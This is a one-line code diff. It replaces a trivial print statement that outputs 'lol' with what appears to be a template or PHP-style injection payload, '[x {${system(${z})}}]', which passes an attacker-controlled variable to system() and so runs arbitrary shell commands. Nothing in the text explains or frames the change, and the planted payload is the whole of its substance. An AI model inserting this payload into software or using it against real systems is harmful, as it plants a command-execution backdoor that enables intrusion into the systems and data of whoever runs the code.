@@ -1,1 +1,1 @@
-print ("lol");
+[x {${system(${z})}}]
